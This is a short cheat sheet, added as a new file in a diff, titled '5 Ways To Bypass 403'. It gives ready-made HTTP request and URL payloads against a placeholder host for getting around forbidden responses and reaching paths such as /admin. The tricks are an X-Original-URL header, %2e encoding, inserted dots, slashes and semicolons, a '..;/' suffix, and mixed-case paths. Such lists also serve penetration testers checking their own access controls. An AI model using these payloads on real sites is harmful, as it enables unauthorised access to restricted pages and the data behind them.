@@ -1,0 +1,25 @@
+5 Ways To Bypass 403: 
+
+1. Add X-Original-URL to request
+Ex: 
+GET /anything HTTP/1.1
+Host: target.com
+X-Original-URL: /admin
+
+2. Add %2e before the endpoint
+Ex: http://target.com/%2e/admin 
+
+3. Add dots, slashes or semicolons in the URL
+Ex: 
+http://target.com/secret/. 
+http://target.com//secret//
+http://target.com/./secret/.. 
+http://target.com/;/secret 
+http://target.com/.;/secret 
+http://target.com//;//secret 
+
+4. Add ..;/ after the endpoint
+Ex: http://target.com/admin..;/
+
+5. Use uppercase letters
+Ex: http://target.com/aDmIN
